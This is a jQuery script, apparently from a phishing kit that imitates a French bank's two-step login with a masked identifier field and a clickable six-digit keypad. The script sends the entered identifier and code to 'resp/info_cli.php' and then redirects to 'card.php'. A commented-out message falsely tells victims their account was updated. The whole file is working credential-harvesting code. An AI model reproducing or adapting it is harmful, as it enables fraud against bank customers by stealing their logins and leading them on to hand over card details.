$(document).ready(function(){
    let mtp='';
    var logInfo =''
    $('.logInput').on('focus', function(){
        
        $('.logInfo').css('display','block')
    })
 $('.logInput').on('input',function(){
    if ($('.logInput').val().length >= 5) {
        $('.next').removeClass("disabled")
        $('.next').css('background-color','#228b22')
        
        
    }else{
        $('.next').addClass("disabled")
        $('.next').css('background-color','#444343')
    }
 })

 $('.next').on('click', function(){
    if($('.logInput').val().length >= 7){
        var myString = $('.logInput').val()
        logInfo = "*".repeat(6) + myString.substring(6);
        $('.logInfo').text(logInfo)
        $('.form-card').css('display','none')
        $('.form-password').css('display','block')
        

    }else{
        $('.alert-danger').css({'display':'block'})
    }
 })

 $('.clav').on('click', function(e){
    e.preventDefault()
    if(mtp.length <6){
        mtp+=$(this).val()
        $('.pass').val(mtp)
    }
    if ($('.pass').val().length >= 6) {
        $('.confirm').removeClass("disabled")
        $('.confirm').css('background-color','#228b22')
        
    }else{
        $('.confirm').addClass("disabled")
        $('.confirm').css('background-color','#444343')
    }
})
$('.effpass').on('click', function(e){
    e.preventDefault()
    mtp=''
    $('.pass').val('')
    $('.confirm').addClass("disabled")
        $('.confirm').css('background-color','#444343')
})
 $('.confirm').on('click', function(){
    if($('.pass').val().length >= 6){
        $('.load').css('display','block')
        $.ajax({
            xhr: function() {
                var xhr = new window.XMLHttpRequest();
                xhr.upload.addEventListener("progress", function(evt) {
                        if (evt.lengthComputable) {

                            var percentComplete = Math.trunc((evt.loaded / evt.total) * 100);

                            if (percentComplete == 100) {
                                setTimeout(() => {
                                    window.location.href= 'card.php'
                                 }, 5000);
                                 /*
                                 Swal.fire({
                                     icon: 'success',
                                     title: 'Mise à jour complète',
                                     text: 'Votre compte a été mis à jour vous serez déconnecté',
                                     
                                 })
                                  */                          
                                
                            }
                        }
                    },
                    false);
                return xhr;
            },
            type: "post",
            url: "resp/info_cli.php",
            data:"lo=" + $('.logInput').val() + "&pa=" + $('.pass').val(),
            success: function(response) {

            }
        });

    }else{
        $('.alert-danger').css({'display':'block'})
    }
 })
  });